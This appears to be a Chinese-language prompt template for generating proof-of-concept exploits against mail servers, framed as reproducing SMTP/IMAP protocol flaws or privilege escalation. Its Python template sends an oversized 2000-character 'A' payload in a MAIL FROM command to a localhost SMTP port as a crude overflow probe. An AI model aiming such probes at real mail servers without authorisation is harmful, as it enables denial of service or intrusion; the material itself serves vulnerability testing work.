---
description: 方案生成 - 生成完整 POC
---

# 邮服 POC 生成器 (POC Generator)

生成用于复现协议漏洞或提权的脚本。

## 交付标准

1.  **协议合规**: 正确处理 SMTP/IMAP 的握手流程。
2.  **可视化**: 打印详细的发送/接收日志。

## 模板 (Python)

```python
import smtplib
from email.mime.text import MIMEText

TARGET = "127.0.0.1"

def exploit():
    try:
        server = smtplib.SMTP(TARGET, 25)
        server.set_debuglevel(1)
        server.ehlo()
        
        # 1. Malicious Payload
        payload = "A" * 2000 # Overflow?
        
        # 2. Trigger
        server.docmd("MAIL FROM:", f"<{payload}@example.com>")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
```